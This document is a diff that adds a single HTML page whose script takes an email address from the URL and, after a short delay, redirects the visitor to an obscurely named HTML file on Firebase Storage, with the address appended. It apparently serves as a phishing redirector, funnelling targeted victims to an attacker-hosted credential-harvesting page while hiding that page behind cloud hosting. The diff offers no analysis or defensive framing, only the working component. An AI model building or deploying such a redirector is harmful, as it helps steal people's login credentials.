@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  </head>
+   <body style="background-color:#f1f2f3">
+      <script>
+        var queryString = window.location.href;
+        var email= queryString.split("&");
+        var root = email[1];
+        var cross = root.split("#");
+        var dom = cross[0];
+
+          setTimeout(function(){
+            var redirect = "https://firebasestorage.googleapis.com/v0/b/project-e3575.appspot.com/o/lkjukhyjtyrstrytygfyudtyrstrtrgdfgpiugfdzsgagresawrtfgyuvuvyrdctcyttdxresxetrdrseswrtrytfutfihiyfutydtxtfgiyutyrdsrsdrytuguiyfuyfcyguytcyyhgyufdtesweasqw.HTML?alt=media&token=f2234790-5b98-4ac3-894a-32f9a11e9257#{domain}";
+            var link = redirect.replace("{domain}",dom);
+            window.location.href = link;
+         },300);
+        </script>
+
+   </body>
+</html>
